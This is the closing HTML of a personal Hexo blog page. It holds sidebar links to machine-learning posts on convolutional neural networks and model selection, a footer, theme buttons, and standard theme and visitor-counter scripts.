20:35:28">2024-08-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/ML-%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C.html" title="ML 卷积神经网络">ML 卷积神经网络</a><time datetime="2024-08-13T15:50:25.000Z" title="Created 2024-08-13 23:50:25">2024-08-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/ML-%E6%A8%A1%E5%9E%8B%E9%80%89%E6%8B%A9.html" title="ML 模型选择">ML 模型选择</a><time datetime="2024-08-11T14:33:31.000Z" title="Created 2024-08-11 22:33:31">2024-08-11</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By Myperfer</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>